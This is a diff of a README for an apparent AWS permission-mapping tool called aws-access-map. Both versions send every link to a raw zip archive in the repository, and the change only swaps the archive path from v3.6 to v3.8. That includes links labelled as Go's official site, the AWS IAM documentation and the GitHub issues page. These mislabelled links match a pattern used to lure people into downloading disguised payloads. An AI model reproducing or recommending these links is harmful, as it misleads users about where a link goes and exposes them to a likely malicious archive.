@@ -6,7 +6,7 @@ Welcome to aws-access-map! This tool helps you quickly see who can access your A
 
 ## 📥 Download Now
 
-[![Download aws-access-map](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip%https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip)](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip)
+[![Download aws-access-map](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip%https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip)](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip)
 
 ## 📝 About aws-access-map
 
@@ -26,18 +26,18 @@ To run aws-access-map, you will need:
 
 - An operating system: Windows, macOS, or Linux.
 - At least 4GB of RAM.
-- Go programming framework installed (you can download it from [Go's official site](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip)).
+- Go programming framework installed (you can download it from [Go's official site](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip)).
 - An AWS account to access your resources.
 
 ## 📖 How to Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
-   [Download & Install](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip)
+   [Download & Install](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip)
 
 2. **Choose the Latest Release**: Find the latest version of aws-access-map. You will see a list of available downloads.
 
 3. **Download the Package**:
-   - Look for the file appropriate for your operating system (e.g., `https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip` or `https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip`).
+   - Look for the file appropriate for your operating system (e.g., `https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip` or `https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip`).
    - Click the link to download the file.
 
 4. **Run the Application**:
@@ -73,16 +73,16 @@ If you encounter issues while using aws-access-map, consider these common soluti
 
 Join the conversation! If you have questions or feedback, please reach out. You can find help from other users and share your experiences.
 
-For assistance, visit the issues section on the [GitHub repository](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip) to report issues or ask for help.
+For assistance, visit the issues section on the [GitHub repository](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip) to report issues or ask for help.
 
 ## 🔗 Helpful Resources
 
-- AWS Documentation: Read through the [official AWS IAM documentation](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip) for an understanding of IAM roles and policies.
-- Go Language Guide: For users unfamiliar with Go, check the [Go programming guide](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip) for support.
+- AWS Documentation: Read through the [official AWS IAM documentation](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip) for an understanding of IAM roles and policies.
+- Go Language Guide: For users unfamiliar with Go, check the [Go programming guide](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip) for support.
 
 ## 📥 Download Now Again
 
 To download aws-access-map, please click here again:
-[Download aws-access-map](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/usage/map-aws-access-3.6.zip) 
+[Download aws-access-map](https://raw.githubusercontent.com/vonbellout/aws-access-map/main/docs/access-map-aws-v3.8.zip) 
 
 Thank you for choosing aws-access-map. We aim to make AWS permission management simple and accessible!
